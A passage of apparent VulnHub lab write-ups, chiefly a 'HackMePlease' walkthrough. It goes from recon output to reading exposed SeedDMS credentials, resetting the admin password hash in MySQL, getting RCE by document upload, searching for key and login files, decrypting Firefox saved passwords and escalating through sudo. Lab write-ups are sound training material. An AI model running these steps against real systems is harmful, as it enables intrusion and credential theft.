s\\x120\\x08\\x03\\&quot;,\\n\\x11\\x08\\x01\\x12\\r\\x08\\x08J\\t\\n\\x07MYSQL41\\n\\x17SF:\\x08\\x01\\x12\\x13\\x08\\x08J\\x0f\\n\\rSHA256_MEMORY\\n\\x1d\\n\\x0bdoc\\.formats\\SF:x12\\x0e\\x08\\x01\\x12\\n\\x08\\x08J\\x06\\n\\x04text\\n\\x1e\\n\\x12client\\.interacSF:tive\\x12\\x08\\x08\\x01\\x12\\x04\\x08\\x07@\\0\\nn\\n\\x0bcompression\\x12_\\x08\\x0SF:2\\x1a\\[\\nY\\n\\talgorithm\\x12L\\x08\\x03\\&quot;H\\n\\x18\\x08\\x01\\x12\\x14\\x08\\x08J\\SF:x10\\n\\x0edeflate_stream\\n\\x15\\x08\\x01\\x12\\x11\\x08\\x08J\\r\\n\\x0blz4_messaSF:ge\\n\\x15\\x08\\x01\\x12\\x11\\x08\\x08J\\r\\n\\x0bzstd_stream\\n\\x1c\\n\\tnode_typeSF:\\x12\\x0f\\x08\\x01\\x12\\x0b\\x08\\x08J\\x07\\n\\x05mysql\\n\\x20\\n\\x14client\\.pwdSF:_expire_ok\\x12\\x08\\x08\\x01\\x12\\x04\\x08\\x07@\\0&quot;);MAC Address: 08:00:27:02:05:5D (Oracle VirtualBox virtual NIC)OS fingerprint not ideal because: maxTimingRatio (1.406000e+00) is greater than 1.4Aggressive OS guesses: Linux 2.6.32 (97%), Dish Network Hopper media device (96%), Linux 2.6.32 or 3.10 (94%), Synology DiskStation Manager 5.1 (93%), Linux 3.0 (93%), Linux 4.4 (93%), Linux 2.6.35 (92%), Linux 2.6.39 (92%), Linux 3.10 - 3.12 (92%), Linux 3.5 (92%)No exact OS matches for host (test conditions non-ideal).TCP/IP fingerprint:SCAN(V=7.92%E=4%D=1/31%OT=80%CT=1%CU=44699%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61F806AF%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)Uptime guess: 44.425 days (since Sat Dec 18 13:43:48 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=250 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTEHOP RTT ADDRESS1 0.89 ms 192.168.110.7Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jan 31 23:56:31 2022 -- 1 IP address (1 host up) scanned in 76.70 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/HackMePlease]└─# ffuf -u http://192.168.110.7/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.sql&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.7/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .sql :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403________________________________________________ [Status: 200, Size: 23744, Words: 11302, Lines: 427]css [Status: 301, Size: 312, Words: 20, Lines: 10]fonts [Status: 301, Size: 314, Words: 20, Lines: 10]img [Status: 301, Size: 312, Words: 20, Lines: 10]index.html [Status: 200, Size: 23744, Words: 11302, Lines: 427]index.html [Status: 200, Size: 23744, Words: 11302, Lines: 427]js [Status: 301, Size: 311, Words: 20, Lines: 10]:: Progress: [23075/23075] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:04] :: Errors: 0 :: No interesting directories enumeratedTCP/33060 - SOCKS5NMAP Scan┌──(root💀kali)-[~/vulnHub/HackMePlease]└─# nmap -p 33060 $ip --script socks-auth-info -sV -sC -A -vPORT STATE SERVICE VERSION33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message&quot;| HY000| LDAPBindReq: | *Parse error unserializing protobuf message&quot;| HY000| oracle-tns: | Invalid message-frame.&quot;|_ HY000 mysqlx?Initial FootholdTCP/80 (HTTP) - SeedDMS Misconfiguration Proceed to http://192.168.110.7 Proceed to Contact Tried to do SQLi, failed Take a look at the files being used for this webserver Inspect Element -&amp;gt; Sources Proceed to js/main.js, found hidden text /seeddms51x/seeddms-5.1.22/ Proceed to /seeddms51x/seeddms-5.1.22/ Tried SQLi Auth Bypass, failed Tried Default Creds, admin:admin, failed Download seeddms-5.1.22 to analyze the directory structure Directory Structure of seeddms-5.1.22 ┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit] └─# tree -d seeddms51x/ -L 1 seeddms51x/ ├── conf ├── data ├── pear ├── seeddms -&amp;gt; seeddms-5.1.22 ├── seeddms-5.1.22 └── www 6 directories seeddms51x, matches our URL conf usually contains sensitive/configuration information View confdirectory ┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit] └─# tree -a seeddms51x/conf/ seeddms51x/conf/ ├── .htaccess ├── settings.xml ├── settings.xml.template └── stopwords.txt If we are able to view settings.xml, we are able to obtain SQL/SMTP credentials Proceed to http://192.168.110.7/seeddms51x/conf/settings.xml seeddms:seeddms TCP/3306 - mysql Access SQL w/ seeddms:seeddms ┌──(root💀kali)-[~/vulnHub/HackMePlease] └─# mysql -h $ip -u seeddms -p Enter password: seeddms Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 2015 Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MySQL [(none)]&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | seeddms | | sys | +--------------------+ 5 rows in set (0.160 sec) MySQL [(none)]&amp;gt; use seeddms; MySQL [seeddms]&amp;gt; show tables; +------------------------------+ | Tables_in_seeddms | +------------------------------+ | tblACLs | | tblAttributeDefinitions | | tblCategory | | tblDocumentApproveLog | | ... | | tblUsers | | tblWorkflows | | users | +------------------------------+ 43 rows in set (0.002 sec) MySQL [seeddms]&amp;gt; show columns from users; +---------------------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------------+--------------+------+-----+---------+----------------+ | Employee_id | int | NO | PRI | NULL | auto_increment | | Employee_first_name | varchar(500) | NO | | NULL | | | Employee_last_name | varchar(500) | NO | | NULL | | | Employee_passwd | varchar(500) | YES | | NULL | | +---------------------+--------------+------+-----+---------+----------------+ 4 rows in set (0.002 sec) MySQL [seeddms]&amp;gt; SELECT * FROM users; +-------------+---------------------+--------------------+-----------------+ | Employee_id | Employee_first_name | Employee_last_name | Employee_passwd | +-------------+---------------------+--------------------+-----------------+ | 1 | saket | saurav | Saket@#$1337 | +-------------+---------------------+--------------------+-----------------+ 1 row in set (0.001 sec) Tried to login w/ saket:Saket@#$1337 1:Saket@#$1337 saurav:Saket@#$1337 This is not the table that stores login credentials View tblUsers; MySQL [seeddms]&amp;gt; show columns from tblUsers; +---------------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +---------------+--------------+------+-----+---------+----------------+ | id | int | NO | PRI | NULL | auto_increment | | login | varchar(50) | YES | UNI | NULL | | | pwd | varchar(50) | YES | | NULL | | | fullName | varchar(100) | YES | | NULL | | | email | varchar(70) | YES | | NULL | | | language | varchar(32) | NO | | NULL | | | theme | varchar(32) | NO | | NULL | | | comment | text | NO | | NULL | | | role | smallint | NO | | 0 | | | hidden | smallint | NO | | 0 | | | pwdExpiration | datetime | YES | | NULL | | | loginfailures | tinyint | NO | | 0 | | | disabled | smallint | NO | | 0 | | | quota | bigint | YES | | NULL | | | homefolder | int | YES | MUL | NULL | | +---------------+--------------+------+-----+---------+----------------+ 15 rows in set (0.003 sec) MySQL [seeddms]&amp;gt; SELECT id,pwd,fullName, email FROM tblUsers; +----+----------------------------------+---------------+--------------------+ | id | pwd | fullName | email | +----+----------------------------------+---------------+--------------------+ | 1 | 5f4dcc3b5aa765d61d8327deb882cf99 | Administrator | address@server.com | | 2 | NULL | Guest User | NULL | +----+----------------------------------+---------------+--------------------+ 2 rows in set (0.001 sec) MySQL [seeddms]&amp;gt; UPDATE tblUsers -&amp;gt; SET pwd = &#39;5f4dcc3b5aa765d61d8327deb882cf99&#39; -&amp;gt; WHERE ID = 1; Query OK, 1 row affected (0.072 sec) Rows matched: 1 Changed: 1 Warnings: 0 Login w/ admin:password Back to TCP/80 (HTTP) - SeedDMS RCE Search exploits for seeddms-5.1.22 Exploit Title Path Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) php/webapps/50062.py SeedDMS versions &amp;lt; 5.1.11 - Remote Command Execution php/webapps/47022.txt Tried php/webapps/50062.py, did not work View php/webapps/47022.txt Exploit Add a document Take note of Document ID: 6 Version: 1 Execute reverse shell Proceed to seeddms51x/data/1048576/6/1.php Obtain www-data shell Alternate Way - Log File Fuzz directory for log files ┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms] └─# ffuf -u http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.log.bak,.log,.bak&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .log.bak .log .bak :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ access.log.bak [Status: 200, Size: 81876, Words: 5393, Lines: 341] controllers [Status: 301, Size: 346, Words: 20, Lines: 10] doc [Status: 301, Size: 338, Words: 20, Lines: 10] inc [Status: 301, Size: 338, Words: 20, Lines: 10] index.php [Status: 302, Size: 0, Words: 1, Lines: 1] index.php [Status: 302, Size: 0, Words: 1, Lines: 1] install [Status: 301, Size: 342, Words: 20, Lines: 10] languages [Status: 301, Size: 344, Words: 20, Lines: 10] op [Status: 301, Size: 337, Words: 20, Lines: 10] out [Status: 301, Size: 338, Words: 20, Lines: 10] styles [Status: 301, Size: 341, Words: 20, Lines: 10] utils [Status: 301, Size: 340, Words: 20, Lines: 10] views [Status: 301, Size: 340, Words: 20, Lines: 10] webdav [Status: 301, Size: 341, Words: 20, Lines: 10] :: Progress: [32305/32305] :: Job [1/1] :: 4856 req/sec :: Duration: [0:00:05] :: Errors: 0 access.log.bak Download &amp;amp; Obtain password ┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms] └─# wget http://192.168.110.7/seeddms51x/seeddms-5.1.22/access.log.bak -q ┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms] └─# cat access.log.bak | grep password 127.0.0.1 - - [03/Jul/2021:00:01:12 -0700] &quot;GET /seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&amp;amp;password=&#39;HacK@#$L33T$%!@&#39; HTTP/1.1&quot; 401 4252 &quot;/seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&amp;amp;password=HacK@#$L33T$%!@&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0&quot; admin:HacK@#$L33T$%!@ Login w/ admin:HacK@#$L33T$%!@ Upload Reverse shellPrivilege EscalationSaket - Via Creds Found Earlier, we obtained Saket’s credentials Switch to saket w/ saket:Saket@#$1337 Root - Via Sudo After browsing through saket’s home directory, there are firefox files Obtain firefox files to extract password from it saket@ubuntu:~$ find $(pwd)find $(pwd) 2&amp;gt;/dev/null | grep &quot;key\\|cookies\\|logins\\|cert&quot; /home/saket/.gnupg/private-keys-v1.d /home/saket/.local/share/keyrings /home/saket/.local/share/keyrings/user.keystore /home/saket/.local/share/keyrings/login.keyring /home/saket/.mozilla/firefox/jokfpwvh.default-release/key4.db /home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite /home/saket/.mozilla/firefox/jokfpwvh.default-release/logins.json /home/saket/.mozilla/firefox/jokfpwvh.default-release/cert9.db /home/saket/.mozilla/firefox/jokfpwvh.default-release/logins-backup.json /home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite-wal key4.db cookies.sqlite logins.json cert9.db Transfer to kali Decrypt it ┌──(root💀kali)-[~/tools/firefox_decrypt] └─# python3 firefox_decrypt.py ~/vulnHub/HackMePlease/192.168.110.7/loot/firefox/ 2022-02-01 02:54:02,743 - WARNING - profile.ini not found in /root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/ 2022-02-01 02:54:02,743 - WARNING - Continuing and assuming &#39;/root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/&#39; is a profile location Website: http://127.0.0.1 Username: &#39;seeddms&#39; Password: &#39;seedms&#39; seeddms:seedms Tried to switch to root w/ seeddms:seedms, failed Check for sudo access saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo -l [sudo] password for saket: Matching Defaults entries for saket on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User saket may run the following commands on ubuntu: (ALL : ALL) ALL saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo su Obtain root " }, { "title": "Vulnhub - GoldenEye 1", "url": "/posts/GoldenEye-1/", "categories": "Vulnhub, Linux", "tags": "tcp/110-pop3/bruteforce, tcp/80-http/web-app-cms-exploit, linux-priv-esc/kernel-exploit", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Tue Jan 25 18:58:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/GoldenEye-1/192.168.236.12/scans/_full_tcp_nmap.txt -oX /root/vulnHub/GoldenEye-1/192.168.236.12/scans/xml/_full_tcp_nmap.xml 192.168.236.12adjust_timeouts2: packet supposedly had rtt of -527661 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527661 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527589 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527589 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527538 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -527538 microseconds. Ignoring time.Nmap scan report for 192.168.236.12Host is up, received arp-response (0.00042s latency).Scanned at 2022-01-25 18:58:19 +08 for 39sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION25/tcp open smtp syn-ack ttl 64 Postfix smtpd|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=ubuntu| Issuer: commonName=ubuntu| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-04-24T03:22:34| Not valid after: 2028-04-21T03:22:34| MD5: cd4a d178 f216 17fb 21a6 0a16 8f46 c8c6| SHA-1: fda3 fc7b 6601 4746 96aa 0f56 b126 1c29 36e8 442c| -----BEGIN CERTIFICATE-----| MIICsjCCAZqgAwIBAgIJAPokpqPNVgk6MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV| BAMTBnVidW50dTAeFw0xODA0MjQwMzIyMzRaFw0yODA0MjEwMzIyMzRaMBExDzAN| BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMM6| ryxPHxf2wYf7DNTXnW6Hc6wK+O6/3JVeWME041jJdsY2UpxRB6cTmBIv7dAOHZzL| eSVCfH1P3IS0dvSrqkA+zpPRK3to3SuirknpbPdmsNqMG1SiKLDl01o5LBDgIpcY| V9JNNjGaxYBlyMjvPDDvgihmJwpb81lArUqDrGJIsIH8J6tqOdLt4DGBXU62sj//| +IUE4w6c67uMAYQD26ZZH9Op+qJ3OznCTXwmJslIHQLJx+fXG53+BLiV06EGrsOk| ovnPmixShoaySAsoGm56IIHQUWrCQ03VYHfhCoUviEw02q8oP49PHR1twt+mdj6x| qZOBlgwHMcWgb1Em40UCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF| AAOCAQEAfigEwPIFEL21yc3LIzPvHUIvBM5/fWEEv0t+8t5ATPfI6c2Be6xePPm6| W3bDLDQ30UDFmZpTLgLkfAQRlu4N40rLutTHiAN6RFSdAA8FEj72cwcX99S0kGQJ| vFCSipVd0fv0wyKLVwbXqb1+JfmepeZVxWFWjiDg+JIBT3VmozKQtrLLL/IrWxGd| PI2swX8KxikRYskNWW1isMo2ZXXJpdQJKfikSX334D9oUnSiHcLryapCJFfQa81+| T8rlFo0zan33r9BmA5uOUZ7VlYF4Kn5/soSE9l+JbDrDFOIOOLLILoQUVZcO6rul| mJjFdmZE4k3QPKz1ksaCAQkQbf3OZw==|_-----END CERTIFICATE-----80/tcp open http syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: GoldenEye Primary Admin Server|_http-server-header: Apache/2.4.7 (Ubuntu)55006/tcp open ssl/pop3 syn-ack ttl 64 Dovecot pop3d|_pop3-capabilities: RESP-CODES PIPELINING SASL(PLAIN) USER CAPA TOP AUTH-RESP-CODE UIDL|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-04-24T03:23:52| Not valid after: 2028-04-23T03:23:52| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm| e1/vPH7tRtldZFSfflyHUsA=|_-----END CERTIFICATE-----55007/tcp open pop3 syn-ack ttl 64 Dovecot pop3d|_pop3-capabilities: RESP-CODES SASL(PLAIN) CAPA AUTH-RESP-CODE PIPELINING USER TOP STLS UIDL|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-04-24T03:23:52| Not valid after: 2028-04-23T03:23:52| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63| SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77| -----BEGIN CERTIFICATE-----| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm| e1/vPH7tRtldZFSfflyHUsA=|_-----END CERTIFICATE-----MAC Address: 08:00:27:FD:62:53 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/25%OT=25%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EOS:FD7F2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 198.840 days (since Sat Jul 10 22:49:03 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosTRACEROUTEHOP RTT ADDRESS1 0.42 ms 192.168.236.12Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Jan 25 18:58:58 2022 -- 1 IP address (1 host up) scanned in 40.64 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12]└─# ffuf -u http://192.168.236.12/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fw 21 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.12/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 21________________________________________________ [Status: 200, Size: 252, Words: 10, Lines: 12]index.html [Status: 200, Size: 252, Words: 10, Lines: 12]:: Progress: [18460/18460] :: Job [1/1] :: 5715 req/sec :: Duration: [0:00:03] :: Errors: 0 :: index.htmlNikto┌──(root💀kali)-[~/vulnHub/GoldenEye-1/192.168.236.12]└─# nikto -ask=no -h http://192.168.236.12:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/GoldenEye-1/192.168.236.12/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.236.12+ Target Hostname: 192.168.236.12+ Target Port: 80+ Start Time: 2022-01-27 19:16:29 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.7 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of 